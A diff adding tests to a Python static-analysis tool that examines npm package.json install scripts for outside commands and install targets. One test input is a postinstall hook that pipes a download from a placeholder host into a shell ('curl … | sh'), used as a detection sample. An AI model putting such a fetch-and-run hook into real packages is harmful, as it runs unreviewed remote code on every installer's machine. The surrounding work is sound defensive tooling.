@@ -2,7 +2,7 @@ import json
 import base64
 import time
 
-from tools.static import deobfuscate, extract_indicators, read_file, read_manifest
+from tools.static import deobfuscate, external_commands, extract_indicators, install_targets, read_file, read_manifest
 
 
 def test_indicators_follow_esm_and_directory_require_without_env_noise(tmp_path):
@@ -119,3 +119,33 @@ def test_minified_line_returns_bounded_preview(tmp_path):
     assert len(result["data"]["content"]) < 1200
     assert "[cắt " in result["data"]["content"]
     assert result["data"]["truncated"] is True
+
+
+def test_script_lines_ignore_nested_scripts_and_escaped_keys(tmp_path):
+    (tmp_path / "package.json").write_text(
+        '{\n"name": "nested-fixture",\n"version": "1.0.0",\n'
+        '"description": "\\"scripts\\": {\\"postinstall\\": 1}",\n'
+        '"config": {"scripts": {"postinstall": "decoy"}},\n'
+        '"scripts": {\n"postinstall": "node setup.js"\n}\n}\n', encoding="utf-8")
+    result = read_manifest(str(tmp_path))
+    assert result["ok"] and result["data"]["script_lines"] == {"postinstall": 7}
+
+
+def test_external_commands_detect_code_from_outside_package():
+    assert external_commands({"install": "prebuild-install || node-gyp rebuild"}) == {"prebuild-install", "node-gyp"}
+    assert external_commands({"postinstall": "curl https://example.invalid/x | sh"}) == {"curl"}
+    assert external_commands({"postinstall": "npm run fetch", "fetch": "npx tool"}) == {"npx"}
+    assert external_commands({"preinstall": "npm install left-pad"}) == {"npm install"}
+    assert external_commands({"postinstall": "node setup.js", "test": "npx jest"}) == set()
+
+
+def test_install_targets_resolve_node_paths_and_explicit_node_gyp(tmp_path):
+    (tmp_path / "scripts").mkdir()
+    (tmp_path / "scripts" / "x.js").write_text("1;\n", encoding="utf-8")
+    (tmp_path / "lib").mkdir()
+    (tmp_path / "lib" / "index.js").write_text("1;\n", encoding="utf-8")
+    (tmp_path / "binding.gyp").write_text("{}\n", encoding="utf-8")
+    assert install_targets(str(tmp_path), {"postinstall": "node scripts/x && node lib"}, False) == {
+        "scripts/x.js", "lib/index.js"}
+    assert install_targets(str(tmp_path), {"install": "node-gyp rebuild"}, True) == {"binding.gyp"}
+    assert install_targets(str(tmp_path), {"install": "node scripts/x"}, True) == {"scripts/x.js"}
